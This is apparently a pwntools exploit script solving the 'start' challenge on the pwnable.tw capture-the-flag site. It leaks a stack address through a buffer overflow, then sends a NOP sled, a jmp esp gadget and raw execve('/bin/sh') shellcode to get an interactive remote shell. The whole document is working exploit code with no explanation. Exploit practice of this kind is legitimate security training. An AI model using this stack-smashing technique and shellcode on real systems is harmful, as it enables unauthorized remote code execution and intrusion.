from pwn import *

int0x80_write_read = 0x08048086
payload = ""
payload += "A" * 20
payload += struct.pack("I", int0x80_write_read)

#sh = process("/home/th3niel/Downloads/start")
sh = remote("chall.pwnable.tw", 10000)

sh.recv()
sh.send(payload)
data = sh.recv()

list = []
for i in xrange(0, len(data), 4):
 	leak = hex(struct.unpack("I", data[i:i+4])[0])
	list.append(leak)
print list

payload_2 = ""
payload_2 += "\x90" * 16
payload_2 += asm("jmp esp", arch='i386', os='linux') + "\x00\x00"
payload_2 += struct.pack("I", int(list[0], 16))
payload_2 += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
sh.send(payload_2)
sh.interactive()
